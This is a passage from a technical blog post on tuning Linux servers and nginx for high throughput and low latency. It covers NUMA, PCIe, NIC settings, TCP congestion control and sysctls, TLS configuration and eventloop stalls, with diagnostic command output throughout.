-&gt; 31         : 4853     |**                                      |\n   ...\n 4096 -&gt; 8191       : 34       |                                        |\n 8192 -&gt; 16383      : 39       |                                        |\n16384 -&gt; 32767      : 17       |                                        | If you see multi-millisecond tail latencies there, then there is probably too much stuff going on on your servers besides nginx itself, and affinity will increase latency, instead of decreasing it. Memory All mm/ tunings are usually very workflow specific, there are only a handful of things to recommend: Set THP to madvise and enable them only when you are sure they are beneficial , otherwise you may get a order of magnitude slowdown while aiming for 20% latency improvement. Unless you are only utilizing only a single NUMA node you should set vm.zone_reclaim_mode to 0. NUMA Modern CPUs are actually multiple separate CPU dies connected by very fast interconnect and sharing various resources, starting from L1 cache on the HT cores, through L3 cache within the package, to Memory and PCIe links within sockets. This is basically what NUMA is: multiple execution and storage units with a fast interconnect. For the comprehensive overview of NUMA and its implications you can consult “ NUMA Deep Dive Series ” by Frank Denneman . But, long story short, you have a choice of: Ignoring it , by disabling it in BIOS or running your software under numactl --interleave=all , you can get mediocre, but somewhat consistent performance. Denying it, by using single node servers, just like Facebook does with OCP Yosemite platform . Embracing it, by optimizing CPU/memory placing in both user- and kernel-space. Let’s talk about the third option, since there is not much optimization needed for the first two. To utilize NUMA properly you need to treat each numa node as a separate server, for that you should first inspect the topology, which can be done with numactl --hardware : Copy $ numactl --hardware\navailable: 4 nodes (0-3)\nnode 0 cpus: 0 1 2 3 16 17 18 19\nnode 0 size: 32149 MB\nnode 1 cpus: 4 5 6 7 20 21 22 23\nnode 1 size: 32213 MB\nnode 2 cpus: 8 9 10 11 24 25 26 27\nnode 2 size: 0 MB\nnode 3 cpus: 12 13 14 15 28 29 30 31\nnode 3 size: 0 MB\nnode distances:\nnode   0   1   2   3\n  0:  10  16  16  16\n  1:  16  10  16  16\n  2:  16  16  10  16\n  3:  16  16  16  10 Things to look after: number of nodes. memory sizes for each node. number of CPUs for each node. distances between nodes. This is a particularly bad example since it has 4 nodes as well as nodes without memory attached. It is impossible to treat each node here as a separate server without sacrificing half of the cores on the system. We can verify that by using numastat : Copy $ numastat -n -c\n                  Node 0   Node 1 Node 2 Node 3    Total\n                -------- -------- ------ ------ --------\nNuma_Hit        26833500 11885723      0      0 38719223\nNuma_Miss          18672  8561876      0      0  8580548\nNuma_Foreign     8561876    18672      0      0  8580548\nInterleave_Hit    392066   553771      0      0   945836\nLocal_Node       8222745 11507968      0      0 19730712\nOther_Node      18629427  8939632      0      0 27569060 You can also ask numastat to output per-node memory usage statistics in the /proc/meminfo format: Copy $ numastat -m -c\n                 Node 0 Node 1 Node 2 Node 3 Total\n                 ------ ------ ------ ------ -----\nMemTotal          32150  32214      0      0 64363\nMemFree             462   5793      0      0  6255\nMemUsed           31688  26421      0      0 58109\nActive            16021   8588      0      0 24608\nInactive          13436  16121      0      0 29557\nActive(anon)       1193    970      0      0  2163\nInactive(anon)      121    108      0      0   229\nActive(file)      14828   7618      0      0 22446\nInactive(file)    13315  16013      0      0 29327\n...\nFilePages         28498  23957      0      0 52454\nMapped              131    130      0      0   261\nAnonPages           962    757      0      0  1718\nShmem               355    323      0      0   678\nKernelStack          10      5      0      0    16 Now lets look at the example of a simpler topology. Copy $ numactl --hardware\navailable: 2 nodes (0-1)\nnode 0 cpus: 0 1 2 3 4 5 6 7 16 17 18 19 20 21 22 23\nnode 0 size: 46967 MB\nnode 1 cpus: 8 9 10 11 12 13 14 15 24 25 26 27 28 29 30 31\nnode 1 size: 48355 MB Since the nodes are mostly symmetrical we can bind an instance of our application to each NUMA node with numactl --cpunodebind=X --membind=X and then expose it on a different port, that way you can get better throughput by utilizing both nodes and better latency by preserving memory locality. You can verify NUMA placement efficiency by latency of your memory operations, e.g. by using bcc’s funclatency to measure latency of the memory-heavy operation, e.g. memmove . On the kernel side, you can observe efficiency by using perf stat and looking for corresponding memory and scheduler events: Copy # perf stat -e sched:sched_stick_numa,sched:sched_move_numa,sched:sched_swap_numa,migrate:mm_migrate_pages,minor-faults -p PID\n...\n                 1      sched:sched_stick_numa\n                 3      sched:sched_move_numa\n                41      sched:sched_swap_numa\n             5,239      migrate:mm_migrate_pages\n            50,161      minor-faults The last bit of NUMA-related optimizations for network-heavy workloads comes from the fact that a network card is a PCIe device and each device is bound to its own NUMA-node, therefore some CPUs will have lower latency when talking to the network. We’ll discuss optimizations that can be applied there when we discuss NIC→CPU affinity, but for now lets switch gears to PCI-Express… PCIe Normally you do not need to go too deep into PCIe troubleshooting unless you have some kind of hardware malfunction. Therefore it’s usually worth spending minimal effort there by just creating “link width”, “link speed”, and possibly RxErr / BadTLP alerts for your PCIe devices. This should save you troubleshooting hours because of broken hardware or failed PCIe negotiation. You can use lspci for that: Copy # lspci -s 0a:00.0 -vvv\n...\nLnkCap: Port #0, Speed 8GT/s, Width x8, ASPM L1, Exit Latency L0s &lt;2us, L1 &lt;16us\nLnkSta: Speed 8GT/s, Width x8, TrErr- Train- SlotClk+ DLActive- BWMgmt- ABWMgmt-\n...\nCapabilities: [100 v2] Advanced Error Reporting\nUESta:  DLP- SDES- TLP- FCP- CmpltTO- CmpltAbrt- ...\nUEMsk:  DLP- SDES- TLP- FCP- CmpltTO- CmpltAbrt- ...\nUESvrt: DLP+ SDES+ TLP- FCP+ CmpltTO- CmpltAbrt- ...\nCESta:  RxErr- BadTLP- BadDLLP- Rollover- Timeout- NonFatalErr-\nCEMsk:  RxErr- BadTLP- BadDLLP- Rollover- Timeout- NonFatalErr+ PCIe may become a bottleneck though if you have multiple high-speed devices competing for the bandwidth (e.g. when you combine fast network with fast storage), therefore you may need to physically shard your PCIe devices across CPUs to get maximum throughput. source: https://en.wikipedia.org/wiki/PCI_Express#History_and_revisions Also see the article, “ Understanding PCIe Configuration for Maximum Performance ,” on the Mellanox website, that goes a bit deeper into PCIe configuration, which may be helpful at higher speeds if you observe packet loss between the card and the OS. Intel suggests that sometimes PCIe power management (ASPM) may lead to higher latencies and therefore higher packet loss. You can disable it by adding pcie_aspm=off to the kernel cmdline. NIC Before we start, it worth mentioning that both Intel and Mellanox have their own performance tuning guides and regardless of the vendor you pick it’s beneficial to read both of them. Also drivers usually come with a README on their own and a set of useful utilities. Next place to check for the guidelines is your operating system’s manuals, e.g. Red Hat Enterprise Linux Network Performance Tuning Guide , which explains most of the optimizations mentioned below and even more. Cloudflare also has a good article about tuning that part of the network stack on their blog, though it is mostly aimed at low latency use-cases. When optimizing NICs ethtool will be your best friend. A small note here: if you are using a newer kernel (and you really should!) you should also bump some parts of your userland, e.g. for network operations you probably want newer versions of: ethtool , iproute2 , and maybe iptables / nftables packages. Valuable insight into what is happening with you network card can be obtained via ethtool -S : Copy $ ethtool -S eth0 | egrep 'miss|over|drop|lost|fifo'\n     rx_dropped: 0\n     tx_dropped: 0\n     port.rx_dropped: 0\n     port.tx_dropped_link_down: 0\n     port.rx_oversize: 0\n     port.arq_overflows: 0 Consult with your NIC manufacturer for detailed stats description, e.g. Mellanox have a dedicated wiki page for them . From the kernel side of things you’ll be looking at /proc/interrupts , /proc/softirqs , and /proc/net/softnet_stat . There are two useful bcc tools here: hardirqs and softirqs . Your goal in optimizing the network is to tune the system until you have minimal CPU usage while having no packet loss. Interrupt Affinity Tunings here usually start with spreading interrupts across the processors. How specifically you should do that depends on your workload: For maximum throughput you can distribute interrupts across all NUMA-nodes in the system. To minimize latency you can limit interrupts to a single NUMA-node. To do that you may need to reduce the number of queues to fit into a single node (this usually implies cutting their number in half with ethtool -L ). Vendors usually provide scripts to do that, e.g. Intel has set_irq_affinity . Ring buffer sizes Network cards need to exchange information with the kernel. This is usually done through a data structure called a “ring”, current/maximum size of that ring viewed via ethtool -g : Copy $ ethtool -g eth0\nRing parameters for eth0:\nPre-set maximums:\nRX:                4096\nTX:                4096\nCurrent hardware settings:\nRX:                4096\nTX:                4096 You can adjust these values within pre-set maximums with -G . Generally bigger is better here (esp. if you are using interrupt coalescing), since it will give you more protection against bursts and in-kernel hiccups, therefore reducing amount of dropped packets due to no buffer space/missed interrupt. But there are couple of caveats: On older kernels, or drivers without BQL support, high values may attribute to a higher bufferbloat on the tx-side. Bigger buffers will also increase cache pressure , so if you are experiencing one, try lowing them. Coalescing Interrupt coalescing allows you to delay notifying the kernel about new events by aggregating multiple events in a single interrupt. Current setting can be viewed via ethtool -c : Copy $ ethtool -c eth0\nCoalesce parameters for eth0:\n...\nrx-usecs: 50\ntx-usecs: 50 You can either go with static limits, hard-limiting maximum number of interrupts per second per core, or depend on the hardware to automatically adjust the interrupt rate based on the throughput. Enabling coalescing (with -C ) will increase latency and possibly introduce packet loss, so you may want to avoid it for latency sensitive. On the other hand, disabling it completely may lead to interrupt throttling and therefore limit your performance. Offloads Modern network cards are relatively smart and can offload a great deal of work to either hardware or emulate that offload in drivers themselves. All possible offloads can be obtained with ethtool -k : Copy $ ethtool -k eth0\nFeatures for eth0:\n...\ntcp-segmentation-offload: on\ngeneric-segmentation-offload: on\ngeneric-receive-offload: on\nlarge-receive-offload: off [fixed] In the output all non-tunable offloads are marked with [fixed] suffix. There is a lot to say about all of them , but here are some rules of thumb: do not enable LRO, use GRO instead. be cautious about TSO, since it highly depends on the quality of your drivers/firmware. do not enable TSO/GSO on old kernels, since it may lead to excessive bufferbloat. **** Packet Steering All modern NICs are optimized for multi-core hardware , therefore they internally split packets into virtual queues, usually one-per CPU. When it is done in hardware it is called RSS, when the OS is responsible for loadbalancing packets across CPUs it is called RPS (with its TX-counterpart called XPS). When the OS also tries to be smart and route flows to the CPUs that are currently handling that socket, it is called RFS. When hardware does that it is called “Accelerated RFS” or aRFS for short. Here are couple of best practices from our production: If you are using newer 25G+ hardware it probably has enough queues and a huge indirection table to be able to just RSS across all your cores. Some older NICs have limitations of only utilizing the first 16 CPUs. You can try enabling RPS if: you have more CPUs than hardware queues and you want to sacrifice latency for throughput. you are using internal tunneling (e.g. GRE/IPinIP) that NIC can’t RSS; Do not enable RPS if your CPU is quite old and does not have x2APIC. Binding each CPU to its own TX queue through XPS is generally a good idea. Effectiveness of RFS is highly depended on your workload and whether you apply CPU affinity to it. Flow Director and ATR Enabled flow director (or fdir in Intel terminology) operates by default in an Application Targeting Routing mode which implements aRFS by sampling packets and steering flows to the core where they presumably are being handled. Its stats are also accessible through ethtool -S : Copy $ ethtool -S eth0 | egrep 'fdir'\nport.fdir_flush_cnt: 0\n... Though Intel claims that fdir increases performance in some cases , external research suggests that it can also introduce up to 1% of packet reordering , which can be quite damaging for TCP performance. Therefore try testing it for yourself and see if FD is useful for your workload, while keeping an eye for the TCPOFOQueue counter. Operating systems: Networking stack There are countless books, videos, and tutorials for the tuning the Linux networking stack. And sadly tons of “sysctl.conf cargo-culting” that comes with them. Even though recent kernel versions do not require as much tuning as they used to 10 years ago and most of the new TCP/IP features are enabled and well-tuned by default, people are still copy-pasting their old sysctls.conf that they’ve used to tune 2.6.18/2.6.32 kernels. To verify effectiveness of network-related optimizations you should: Collect system-wide TCP metrics via /proc/net/snmp and /proc/net/netstat . Aggregate per-connection metrics obtained either from ss -n --extended --info , or from calling getsockopt( TCP_INFO ) / getsockopt( TCP_CC_INFO ) inside your webserver. tcptrace (1)’es of sampled TCP flows. Analyze RUM metrics from the app/browser. For sources of information about network optimizations, I usually enjoy conference talks by CDN-folks since they generally know what they are doing, e.g. Fastly on LinuxCon Australia . Listening what Linux kernel devs say about networking is quite enlightening too, for example netdevconf talks and NETCONF transcripts . It worth highlighting good deep-dives into Linux networking stack by PackageCloud, especially since they put an accent on monitoring instead of blindly tuning things: Monitoring and Tuning the Linux Networking Stack: Receiving Data Monitoring and Tuning the Linux Networking Stack: Sending Data Before we start, let me state it one more time: upgrade your kernel ! There are tons of new network stack improvements, and I’m not even talking about IW10 ( which is so 2010 ). I am talking about new hotness like: TSO autosizing, FQ, pacing, TLP, and RACK, but more on that later. As a bonus by upgrading to a new kernel you’ll get a bunch of scalability improvements, e.g.: removed routing cache , lockless listen sockets , SO_REUSEPORT , and many more . Overview From the recent Linux networking papers the one that stands out is “ Making Linux TCP Fast .” It manages to consolidate multiple years of Linux kernel improvements on 4 pages by breaking down Linux sender-side TCP stack into functional pieces: Fair Queueing and Pacing Fair Queueing is responsible for improving fairness and reducing head of line blocking between TCP flows, which positively affects packet drop rates. Pacing schedules packets at rate set by congestion control equally spaced over time, which reduces packet loss even further, therefore increasing throughput. As a side note: Fair Queueing and Pacing are available in linux via fq qdisc . Some of you may know that these are a requirement for BBR ( not anymore though ), but both of them can be used with CUBIC, yielding up to 15-20% reduction in packet loss and therefore better throughput on loss-based CCs. Just don’t use it in older kernels (< 3.19), since you will end up pacing pure ACKs and cripple your uploads/RPCs. TSO autosizing and TSQ Both of these are responsible for limiting buffering inside the TCP stack and hence reducing latency, without sacrificing throughput. Congestion Control CC algorithms are a huge subject by itself, and there was a lot of activity around them in recent years. Some of that activity was codified as: tcp_cdg ( CAIA ), tcp_nv (Facebook), and tcp_bbr (Google). We won’t go too deep into discussing their inner-workings, let’s just say that all of them rely more on delay increases than packet drops for a congestion indication. BBR is arguably the most well-documented, tested, and practical out of all new congestion controls. The basic idea is to create a model of the network path based on packet delivery rate and then execute control loops to maximize bandwidth while minimizing rtt. This is exactly what we are looking for in our proxy stack. Preliminary data from BBR experiments on our Edge PoPs shows an increase of file download speeds: 6 hour TCP BBR experiment in Tokyo PoP: x-axis — time, y-axis — client download speed Here I want to stress out that we observe speed increase across all percentiles. That is not the case for backend changes. These usually only benefit p90+ users (the ones with the fastest internet connectivity), since we consider everyone else being bandwidth-limited already. Network-level tunings like changing congestion control or enabling FQ/pacing show that users are not being bandwidth-limited but, if I can say this, they are “TCP-limited.” If you want to know more about BBR, APNIC has a good entry-level overview of BBR (and its comparison to loss-based congestions controls). For more in-depth information on BBR you probably want to read through bbr-dev mailing list archives (it has a ton of useful links pinned at the top). For people interested in congestion control in general it may be fun to follow Internet Congestion Control Research Group activity. ACK Processing and Loss Detection But enough about congestion control, let’s talk about let’s talk about loss detection, here once again running the latest kernel will help quite a bit. New heuristics like TLP and RACK are constantly being added to TCP, while the old stuff like FACK and ER is being retired. Once added, they are enabled by default so you do not need to tune any system settings after the upgrade. Userspace prioritization and HOL Userspace socket APIs provide implicit buffering and no way to re-order chunks once they are sent, therefore in multiplexed scenarios (e.g. HTTP/2) this may result in a HOL blocking, and inversion of h2 priorities. TCP_NOTSENT_LOWAT socket option (and corresponding net.ipv4.tcp_notsent_lowat sysctl) were designed to solve this problem by setting a threshold at which the socket considers itself writable (i.e. epoll will lie to your app). This can solve problems with HTTP/2 prioritization, but it can also potentially negatively affect throughput, so you know the drill—test it yourself. Sysctls One does not simply give a networking optimization talk without mentioning sysctls that need to be tuned. But let me first start with the stuff you don’t want to touch: net.ipv4.tcp_tw_recycle=1 — don’t use it —it was already broken for users behind NAT, but if you upgrade your kernel, it will be broken for everyone . net.ipv4.tcp_timestamps=0 —don’t disable them unless you know all side-effects and you are OK with them. For example, one of non-obvious side effects is that you will loose window scaling and SACK options on syncookies . As for sysctls that you should be using: net.ipv4.tcp_slow_start_after_idle=0 —the main problem with slowstart after idle is that “idle” is defined as one RTO, which is too small. net.ipv4.tcp_mtu_probing=1 — useful if there are ICMP blackholes between you and your clients (most likely there are). net.ipv4.tcp_rmem , net.ipv4.tcp_wmem —should be tuned to fit BDP, just don’t forget that bigger isn’t always better . echo 2 > /sys/module/tcp_cubic/parameters/hystart_detect —if you are using fq+cubic, this might help with tcp_cubic exiting the slow-start too early . It also worth noting that there is an RFC draft (though a bit inactive) from the author of curl, Daniel Stenberg, named TCP Tuning for HTTP , that tries to aggregate all system tunings that may be beneficial to HTTP in a single place. Application level: Midlevel Tooling Just like with the kernel, having up-to-date userspace is very important. You should start with upgrading your tools, for example you can package newer versions of perf , bcc , etc. Once you have new tooling you are ready to properly tune and observe the behavior of a system. Through out this part of the post we’ll be mostly relying on on-cpu profiling with perf top , on-CPU flamegraphs , and adhoc histograms from bcc ’s funclatency . Compiler Toolchain Having a modern compiler toolchain is essential if you want to compile hardware-optimized assembly, which is present in many libraries commonly used by web servers. Aside from the performance, newer compilers have new security features (e.g. -fstack-protector-strong or SafeStack ) that you want to be applied on the edge. The other use case for modern toolchains is when you want to run your test harnesses against binaries compiled with sanitizers (e.g. AddressSanitizer , and friends ). System libraries It’s also worth upgrading system libraries, like glibc, since otherwise you may be missing out on recent optimizations in low-level functions from -lc , -lm , -lrt , etc. Test-it-yourself warning also applies here, since occasional regressions creep in. Zlib Normally web server would be responsible for compression. Depending on how much data is going though that proxy, you may occasionally see zlib’s symbols in perf top , e.g.: Copy # perf top\n...\n   8.88%  nginx        [.] longest_match\n   8.29%  nginx        [.] deflate_slow\n   1.90%  nginx        [.] compress_block There are ways of optimizing that on the lowest levels: both Intel and Cloudflare , as well as a standalone zlib-ng project, have their zlib forks which provide better performance by utilizing new instructions sets. Malloc We’ve been mostly CPU-oriented when discussing optimizations up until now, but let’s switch gears and discuss memory-related optimizations. If you use lots of Lua with FFI or heavy third party modules that do their own memory management, you may observe increased memory usage due to fragmentation. You can try solving that problem by switching to either jemalloc or tcmalloc . Using custom malloc also has the following benefits: Separating your nginx binary from the environment, so that glibc version upgrades and OS migration will affect it less. Better introspection , profiling and stats . PCRE If you use many complex regular expressions in your nginx configs or heavily rely on Lua, you may see pcre-related symbols in perf top . You can optimize that by compiling PCRE with JIT, and also enabling it in nginx via pcre_jit on; . You can check the result of optimization by either looking at flame graphs, or using funclatency : Copy # funclatency /srv/nginx-bazel/sbin/nginx:ngx_http_regex_exec -u\n...\n     usecs               : count     distribution\n         0 -&gt; 1          : 1159     |**********                              |\n         2 -&gt; 3          : 4468     |****************************************|\n         4 -&gt; 7          : 622      |*****                                   |\n         8 -&gt; 15         : 610      |*****                                   |\n        16 -&gt; 31         : 209      |*                                       |\n        32 -&gt; 63         : 91       |                                        | TLS If you are terminating TLS on the edge w/o being fronted by a CDN, then TLS performance optimizations may be highly valuable. When discussing tunings we’ll be mostly focusing server-side efficiency. So, nowadays first thing you need to decide is which TLS library to use: Vanilla OpenSSL , OpenBSD’s LibreSSL , or Google’s BoringSSL . After picking the TLS library flavor, you need to properly build it: OpenSSL for example has a bunch of built-time heuristics that enable optimizations based on build environment; BoringSSL has deterministic builds, but sadly is way more conservative and just disables some optimizations by default . Anyway, here is where choosing a modern CPU should finally pay off: most TLS libraries can utilize everything from AES-NI and SSE to ADX and AVX512. You can use built-in performance tests that come with your TLS library, e.g. in BoringSSL case it’s the bssl speed . Most of performance comes not from the hardware you have, but from cipher-suites you are going to use, so you have to optimize them carefully. Also know that changes here can (and will!) affect security of your web server—the fastest ciphersuites are not necessarily the best. If unsure what encryption settings to use, Mozilla SSL Configuration Generator is a good place to start. Asymmetric Encryption If your service is on the edge, then you may observe a considerable amount of TLS handshakes and therefore have a good chunk of your CPU consumed by the asymmetric crypto, making it an obvious target for optimizations. To optimize server-side CPU usage you can switch to ECDSA certs, which are generally 10x faster than RSA. Also they are considerably smaller, so it may speedup handshake in presence of packet-loss. But ECDSA is also heavily dependent on the quality of your system’s random number generator, so if you are using OpenSSL, be sure to have enough entropy (with BoringSSL you do not need to worry about that ). As a side note, it worth mentioning that bigger is not always better, e.g. using 4096 RSA certs will degrade your performance by 10x: Copy $ bssl speed\nDid 1517 RSA 2048 signing ... (1507.3 ops/sec)\nDid 160 RSA 4096 signing ...  (153.4 ops/sec) To make it worse, smaller isn’t necessarily the best choice either: by using non-common p-224 field for ECDSA you’ll get 60% worse performance compared to a more common p-256: Copy $ bssl speed\nDid 7056 ECDSA P-224 signing ...  (6831.1 ops/sec)\nDid 17000 ECDSA P-256 signing ... (16885.3 ops/sec) The rule of thumb here is that the most commonly used encryption is generally the most optimized one. When running properly optimized OpenTLS-based library using RSA certs, you should see the following traces in your perf top : AVX2-capable, but not ADX-capable boxes (e.g. Haswell) should use AVX2 codepath: Copy 6.42%  nginx                [.] rsaz_1024_sqr_avx2\n  1.61%  nginx                [.] rsaz_1024_mul_avx2 While newer hardware should use a generic montgomery multiplication with ADX codepath: Copy 7.08%  nginx                [.] sqrx8x_internal\n  2.30%  nginx                [.] mulx4x_internal Symmetric Encryption If you have lot’s of bulk transfers like videos, photos, or more generically files, then you may start observing symmetric encryption symbols in profiler’s output. Here you just need to make sure that your CPU has AES-NI support and you set your server-side preferences for AES-GCM ciphers. Properly tuned hardware should have following in perf top : Copy 8.47%  nginx                [.] aesni_ctr32_ghash_6x But it’s not only your servers that will need to deal with encryption/decryption—your clients will share the same burden on a way less capable CPU. Without hardware acceleration this may be quite challenging , therefore you may consider using an algorithm that was designed to be fast without hardware acceleration, e.g. ChaCha20-Poly1305 . This will reduce TTLB for some of your mobile clients. ChaCha20-Poly1305 is supported in BoringSSL out of the box, for OpenSSL 1.0.2 you may consider using Cloudflare patches . BoringSSL also supports “ equal preference cipher groups ,” so you may use the following config to let clients decide what ciphers to use based on their hardware capabilities (shamelessly stolen from cloudflare/sslconfig ): Copy ssl_ciphers '[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]:ECDHE+AES128:RSA+AES128:ECDHE+AES256:RSA+AES256:ECDHE+3DES:RSA+3DES';\nssl_prefer_server_ciphers on; Application level: Highlevel To analyze effectiveness of your optimizations on that level you will need to collect RUM data. In browsers you can use Navigation Timing APIs and Resource Timing APIs . Your main metrics are TTFB and TTV/TTI. Having that data in an easily queriable and graphable formats will greatly simplify iteration. Compression Compression in nginx starts with mime.types file, which defines default correspondence between file extension and response MIME type. Then you need to define what types you want to pass to your compressor with e.g. gzip_types . If you want the complete list you can use mime-db to autogenerate your mime.types and to add those with .compressible == true to gzip_types . When enabling gzip, be careful about two aspects of it: Increased memory usage. This can be solved by limiting gzip_buffers . Increased TTFB due to the buffering. This can be solved by using [ gzip_no_buffer ] . As a side note, http compression is not limited to gzip exclusively: nginx has a third party ngx_brotli module that can improve compression ratio by up to 30% compared to gzip. As for compression settings themselves, let’s discuss two separate use-cases: static and dynamic data. For static data you can archive maximum compression ratios by pre-compressing your static assets as a part of the build process. We discussed that in quite a detail in the Deploying Brotli for static content post for both gzip and brotli. For dynamic data you need to carefully balance a full roundtrip: time to compress the data + time to transfer it + time to decompress on the client. Therefore setting the highest possible compression level may be unwise, not only from CPU usage perspective, but also from TTFB. Buffering Buffering inside the proxy can greatly affect web server performance, especially with respect to latency. The nginx proxy module has various buffering knobs that are togglable on a per-location basis, each of them is useful for its own purpose. You can separately control buffering in both directions via proxy_request_buffering and proxy_buffering . If buffering is enabled the upper limit on memory consumption is set by client_body_buffer_size and proxy_buffers , after hitting these thresholds request/response is buffered to disk. For responses this can be disabled by setting proxy_max_temp_file_size to 0. Most common approaches to buffering are: Buffer request/response up to some threshold in memory and then overflow to disk. If request buffering is enabled, you only send a request to the backend once it is fully received, and with response buffering, you can instantaneously free a backend thread once it is ready with the response. This approach has the benefits of improved throughput and backend protection at the cost of increased latency and memory/io usage (though if you use SSDs that may not be much of a problem). No buffering. Buffering may not be a good choice for latency sensitive routes, especially ones that use streaming. For them you may want to disable it, but now your backend needs to deal with slow clients (incl. malicious slow-POST/ slow-read kind of attacks). Application-controlled response buffering through the X-Accel-Buffering header. Whatever path you choose, do not forget to test its effect on both TTFB and TTLB. Also, as mentioned before, buffering can affect IO usage and even backend utilization, so keep an eye out for that too. TLS Now we are going to talk about high-level aspects of TLS and latency improvements that could be done by properly configuring nginx. Most of the optimizations I’ll be mentioning are covered in the High Performance Browser Networking ’s “ Optimizing for TLS ” section and Making HTTPS Fast(er) talk at nginx.conf 2014. Tunings mentioned in this part will affect both performance and security of your web server, if unsure, please consult with Mozilla’s Server Side TLS Guide and/or your Security Team. To verify the results of optimizations you can use: WebpageTest for impact on performance. SSL Server Test from Qualys , or Mozilla TLS Observatory for impact on security. Session resumption As DBAs love to say “the fastest query is the one you never make.” The same goes for TLS—you can reduce latency by one RTT if you cache the result of the handshake. There are two ways of doing that: You can ask the client to store all session parameters (in a signed and encrypted way), and send it to you during the next handshake (similar to a cookie). On the nginx side this is configured via the ssl_session_tickets directive. This does not not consume any memory on the server-side but has a number of downsides: You need the infrastructure to create, rotate, and distribute random encryption/signing keys for your TLS sessions. Just remember that you really shouldn’t 1) use source control to store ticket keys 2) generate these keys from other non-ephemeral material e.g. date or cert. PFS won’t be on a per-session basis but on a per-tls-ticket-key basis, so if an attacker gets a hold of the ticket key, they can potentially decrypt any captured traffic for the duration of the ticket. Your encryption will be limited to the size of your ticket key. It does not make much sense to use AES256 if you are using 128-bit ticket key. Nginx supports both 128 bit and 256 bit TLS ticket keys. Not all clients support ticket keys (all modern browsers do support them though). Or you can store TLS session parameters on the server and only give a reference (an id) to the client. This is done via the ssl_session_cache directive. It has a benefit of preserving PFS between sessions and greatly limiting attack surface. Though ticket keys have downsides: They consume ~256 bytes of memory per session on the server, which means you can’t store many of them for too long. They can not be easily shared between servers. Therefore you either need a loadbalancer which will send the same client to the same server to preserve cache locality, or write a distributed TLS session storage on top off something like ngx_http_lua_module . As a side note, if you go with session ticket approach, then it’s worth using 3 keys instead of one, e.g.: Copy ssl_session_tickets on;\nssl_session_timeout 1h;\nssl_session_ticket_key /run/nginx-ephemeral/nginx_session_ticket_curr;\nssl_session_ticket_key /run/nginx-ephemeral/nginx_session_ticket_prev;\nssl_session_ticket_key /run/nginx-ephemeral/nginx_session_ticket_next; You will be always encrypting with the current key, but accepting sessions encrypted with both next and previous keys. OCSP Stapling You should staple your OCSP responses, since otherwise: Your TLS handshake may take longer because the client will need to contact the certificate authority to fetch OCSP status. On OCSP fetch failure may result in availability hit. You may compromise users’ privacy since their browser will contact a third party service indicating that they want to connect to your site. To staple the OCSP response you can periodically fetch it from your certificate authority, distribute the result to your web servers, and use it with the ssl_stapling_file directive: Copy ssl_stapling_file /var/cache/nginx/ocsp/www.der; TLS record size TLS breaks data into chunks called records, which you can’t verify and decrypt until you receive it in its entirety. You can measure this latency as the difference between TTFB from the network stack and application points of view. By default nginx uses 16k chunks, which do not even fit into IW10 congestion window, therefore require an additional roundtrip. Out-of-the box nginx provides a way to set record sizes via ssl_buffer_size directive: To optimize for low latency you should set it to something small, e.g. 4k. Decreasing it further will be more expensive from a CPU usage perspective. To optimize for high throughput you should leave it at 16k. There are two problems with static tuning: You need to tune it manually. You can only set ssl_buffer_size on a per-nginx config or per-server block basis, therefore if you have a server with mixed latency/throughput workloads you’ll need to compromize. There is an alternative approach: dynamic record size tuning. There is an nginx patch from Cloudflare that adds support for dynamic record sizes . It may be a pain to initially configure it, but once you over with it, it works quite nicely. TLS 1.3 TLS 1.3 features indeed sound very nice , but unless you have resources to be troubleshooting TLS full-time I would suggest not enabling it, since: It is still a draft . 0-RTT handshake has some security implications . And your application needs to be ready for it. There are still middleboxes (antiviruses, DPIs, etc) that block unknown TLS versions. Eventloop Stalls Nginx is an eventloop-based web server, which means it can only do one thing at a time. Even though it seems that it does all of these things simultaneously, like in time-division multiplexing, all nginx does is just quickly switches between the events, handling one after another . It all works because handling each event takes only couple of microseconds. But if it starts taking too much time, e.g. because it requires going to a spinning disk, latency can skyrocket. If you start noticing that your nginx are spending too much time inside the ngx_process_events_and_timers function, and distribution is bimodal, then you probably are affected by eventloop stalls. Copy # funclatency '/srv/nginx-bazel/sbin/nginx:ngx_process_events_and_timers' -m\n     msecs               : count     distribution\n         0 -&gt; 1          : 3799     |****************************************|\n         2 -&gt; 3          : 0        |                                        |\n         4 -&gt; 7          : 0        |                                        |\n         8 -&gt; 15         : 0        |                                        |\n        16 -&gt; 31         : 409      |****                                    |\n        32 -&gt; 63         : 313      |***                                     |\n        64 -&gt; 127        : 128      |*                                       | AIO and Threadpools Since the main source of eventloop stalls especially on spinning disks is IO, you should probably look there first. You can measure how much you are affected by it by running fileslower : Copy # fileslower 10\nTracing sync read/writes slower than 10 ms\nTIME(s)  COMM           TID    D BYTES   LAT(ms) FILENAME\n2.642    nginx          69097  R 5242880   12.18 0002121812\n4.760    nginx          69754  W 8192      42.08 0002121598\n4.760    nginx          69435  W 2852      42.39 0002121845\n4.760    nginx          69088  W 2852      41.83 0002121854 To fix this, nginx has support for offloading IO to a threadpool (it also has support for AIO, but native AIO in Unixes have lots of quirks, so better to avoid it unless you know what you doing). A basic setup consists of simply: Copy aio threads;\naio_write on; For more complicated cases you can set up custom thread_pool 's, e.g. one per-disk, so that if one drive becomes wonky, it won’t affect the rest of the requests. Thread pools can greatly reduce the number of nginx processes stuck in D state, improving both latency and throughput. But it won’t eliminate eventloop stalls fully, since not all IO operations are currently offloaded to it. Logging Writing logs can also take a considerable amount of time, since it is hitting disks. You can check whether that’s that case by running ext4slower and looking for access/error log references: Copy # ext4slower 10\nTIME     COMM           PID    T BYTES   OFF_KB   LAT(ms) FILENAME\n06:26:03 nginx          69094  W 163070  634126     18.78 access.log\n06:26:08 nginx          69094  W 151     126029     37.35 error.log\n06:26:13 nginx          69082  W 153168  638728    159.96 access.log It is possible to workaround this by spooling access logs in memory before writing them by using buffer parameter for the access_log directive. By using gzip parameter you can also compress the logs before writing them to disk, reducing IO pressure even more. But to fully eliminate IO stalls on log writes you should just write logs via syslog , this way logs will be fully integrated with nginx eventloop. Open file cache Since open(2) calls are inherently blocking and web servers are routinely opening/reading/closing files it may be beneficial to have a cache of open files. You can see how much benefit there is by looking at ngx_open_cached_file function latency: Copy # funclatency /srv/nginx-bazel/sbin/nginx:ngx_open_cached_file -u\n     usecs               : count     distribution\n         0 -&gt; 1          : 10219    |****************************************|\n         2 -&gt; 3          : 21       |                                        |\n         4 -&gt; 7          : 3        |                                        |\n         8 -&gt; 15         : 1        |                                        | If you see that either there are too many open calls or there are some that take too much time, you can can look at enabling open file cache: Copy 